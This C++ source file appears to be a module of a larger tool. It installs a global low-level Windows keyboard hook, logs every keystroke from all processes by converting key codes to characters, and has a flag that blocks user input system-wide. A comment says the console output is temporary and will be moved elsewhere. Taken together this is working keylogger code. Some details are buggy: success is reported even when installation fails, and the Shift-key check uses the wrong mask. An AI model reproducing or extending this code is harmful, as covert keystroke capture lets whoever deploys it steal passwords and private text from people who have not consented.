#include "keyboard.h"

bool gKeyboardLocked = 0; // temporary global variable to simulate keyboard being either locked or released

void KeyboardMod::start() {
    
    // set the keyboard hook for all processes on the computer
    // runs the hookCallback function when hooked is triggered
    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());
    }

    wprintf(L"Hook successfully installed!\n");
    
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
        
    }

}

void KeyboardMod::kill() {

    UnhookWindowsHookEx(ghHook);

}

void logKeystroke(int vkCode) {
    // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
    // resolution and logging of the keystrokes is performed here
    // also ignores mouse inputs
    
    HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());

    
    // check for CapsLock
    bool lowercase = !(GetKeyState(VK_CAPITAL) & 0x0001);
    
    // check for Shift keys
    if((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000)) {
        lowercase = !lowercase;
    }

    char key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
    key = (lowercase) ? tolower(key) : key;

    // print to test functionality, MUST move to another location eventually
    wprintf(L"%c\n", key);
}

LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    // function handler for all keyboard strokes

    if(nCode >= 0) {
        if(wParam == WM_KEYDOWN) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            logKeystroke(kbdStruct.vkCode);
        }
    }

    // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
    return (gKeyboardLocked)? 1 : CallNextHookEx(ghHook, nCode, wParam, lParam);
}